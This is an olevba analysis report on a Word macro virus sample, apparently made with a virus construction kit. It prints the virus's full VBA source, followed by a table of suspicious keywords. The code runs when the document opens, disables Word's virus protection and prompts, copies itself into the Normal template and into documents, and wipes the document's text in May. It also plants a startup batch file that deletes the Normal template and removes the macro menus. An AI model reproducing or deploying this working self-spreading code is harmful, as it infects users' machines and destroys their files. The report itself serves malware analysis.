olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-6f5c549463c9e0a626615f45cdb4dc7cdb96e122
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-6f5c549463c9e0a626615f45cdb4dc7cdb96e122 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iranewry.bas 
in file: Virus.MSWord.VMPC-based-6f5c549463c9e0a626615f45cdb4dc7cdb96e122 - OLE stream: 'Macros/VBA/iranewry'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub iranewry()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Daddy's got a big o'l bag-a-chicken"
    'Poppy ID : 961446574957
    
    
On Error Resume Next
k9766 = m8165 & e1376
f9348 = u12347 & c12470 & Int(Rnd * 9104)
k15324 = m6046 & e12028
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
k12669 = m12189 & e15736
f14146 = u5380 & c14844 & Int(Rnd * 9606)
If Month(Now()) = 5 Then Call p8686
k16575 = m7353 & e17694
f7147 = u10126 & c4372 & k6644 & m10126
u465796149 = 0
Set Unit187961446578 = MacroContainer
k5889 = m9157 & e15344
f9469 = u10713 & c13703 & k11170 & m10713
 f6003$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f11539 = u9224 & c11496 & Int(Rnd * 3364)
a86869614 = GetAttr(NormalTemplate.FullName)
f505 = u9969 & c17600 & Int(Rnd * 86)
k5297 = m9890 & e16100
If a86869614 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6003$)
f6861 = u14556 & c10356 & k11141 & m14556
k10110 = m17262 & e12550
If a86869614 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6003$)
If a86869614 = vbReadOnly Then GoTo fuckoff
f8718 = u7026 & c3823 & Int(Rnd * 3394)
f2874 = u9394 & c8480 & Int(Rnd * 5199)
If a86869614 = vbReadOnly + vbArchive Then GoTo fuckoff
k9546 = m14150 & e9235
k2355 = m19246 & e10488
If Unit187961446578 = NormalTemplate Then u465796149 = 1
If u465796149 = 1 Then mmf46571 = NormalTemplate.FullName Else mmf46571 = ActiveDocument.FullName
If u465796149 = 1 Then mnop96146 = ActiveDocument.FullName Else mnop96146 = NormalTemplate.FullName
f6124 = u6215 & c9546 & Int(Rnd * 140)
k3797 = m18412 & e12367
Application.OrganizerCopy Source:=mmf46571, Destination:=mnop96146, Name:="iranewry", Object:=wdOrganizerObjectProjectItems
k5641 = m18987 & e7277
f6350 = u7601 & c12943 & Int(Rnd * 2599)
If u465796149 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
k5917 = m5313 & e11271
If u465796149 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
k8047 = m2675 & e5501
     End If
f5527 = u14388 & c13373 & k10893 & m14388
f11777 = u5955 & c3967 & Int(Rnd * 5987)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
f12992 = u7759 & c9714 & k8171 & m7759
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "IRA-Newry", vbInformation
k8076 = m8830 & e11428
k12297 = m6936 & e8634
End Sub
Sub AutoOpen()
    On Error Resume Next
k10138 = m3419 & e8478
    Call iranewry
End Sub
Sub ViewVBCode()
    On Error Resume Next
k13767 = m12256 & e6441
k6548 = m11197 & e11767
End Sub
Sub p8686()
    On Error Resume Next
f9754 = u16281 & c17718 & k16671 & m16281
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
f7730 = u6609 & c11472 & Int(Rnd * 3128)
f13742 = u11445 & c9595 & Int(Rnd * 3777)
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
k10797 = m5459 & e14899
f16004 = u7849 & c8312 & Int(Rnd * 6655)
n$ = NormalTemplate
f9873 = u14647 & c8953 & Int(Rnd * 5216)
Part11$ = "attrib -h -r "
k18266 = m16687 & e7642
snag$ = "c:\progra~1\micros~1\templa~1\"
f5646 = u12753 & c4609 & Int(Rnd * 4548)
snag1$ = "c:\progra~1\micros~2\templa~1\"
k5049 = m9720 & e8034
k9890 = m3250 & e10409
Part2$ = "del "
k15859 = m13001 & e9417
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f16515 = u4805 & c15723 & k15171 & m4805
f10908 = u13902 & c12850 & Int(Rnd * 7654)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

